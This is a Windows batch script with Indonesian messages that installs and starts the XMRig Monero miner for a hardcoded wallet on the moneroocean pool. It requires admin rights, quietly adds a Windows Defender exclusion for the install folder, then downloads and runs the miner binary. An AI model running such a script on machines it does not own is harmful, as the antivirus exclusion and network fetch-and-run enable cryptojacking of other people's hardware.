@echo off
:: Cek Akses Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Harus dijalankan sebagai Administrator!
    exit /b 1
)

:: SETTING WALLET & WORKER
set "WALLET=48Cdv8BajGJJrgA4aFnQU64sugzQWzqKwLMMuKdjZdFvNAXF3P2WabWKjsfV3YMsb4BAaDDn5dYzea7HuyQ9RDvhAZQnNCx"
set "WORKER=epyc-server"
set "INSTALL_DIR=C:\xmrig"

echo [+] Menyiapkan folder dan pengecualian Windows Defender...
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (!(Test-Path '%INSTALL_DIR%')) { New-Item -ItemType Directory -Path '%INSTALL_DIR%' | Out-Null }; Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1

echo [+] Download dan Ekstrak XMRig...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$z='%TEMP%\x.zip'; iwr -useb 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip' -OutFile $z; Expand-Archive $z '%TEMP%\x' -Force; Get-ChildItem '%TEMP%\x\*' -Recurse | Move-Item -Destination '%INSTALL_DIR%' -Force; Remove-Item $z, '%TEMP%\x' -Recurse -Force" >nul 2>&1

echo [+] Memulai XMRig di terminal ini...
cd /d "%INSTALL_DIR%"
xmrig.exe -o gulf.moneroocean.stream:10128 -u %WALLET% -p %WORKER% -a rx/0 --donate-level 1
